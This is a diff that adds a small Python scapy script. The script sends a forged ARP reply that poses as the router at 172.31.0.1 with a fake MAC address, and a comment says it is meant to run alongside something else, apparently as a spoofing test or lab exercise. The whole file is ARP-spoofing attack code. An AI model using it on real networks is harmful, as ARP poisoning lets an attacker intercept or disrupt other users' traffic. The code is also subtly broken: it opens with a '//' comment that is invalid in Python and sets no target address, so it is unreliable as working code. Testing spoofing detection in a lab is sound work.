@@ -1,0 +1,12 @@
+//SHOULD RUN IN OTHER TERMINAL TO SEND FAKE IP ADDRESS
+from scapy.all import *
+
+packet = ARP(
+    op=2,                      # ARP reply
+    psrc="172.31.0.1",         # pretend router IP
+    hwsrc="11:22:33:44:55:66" # fake MAC
+)
+
+send(packet, verbose=False)
+
+print("Fake ARP packet sent.")
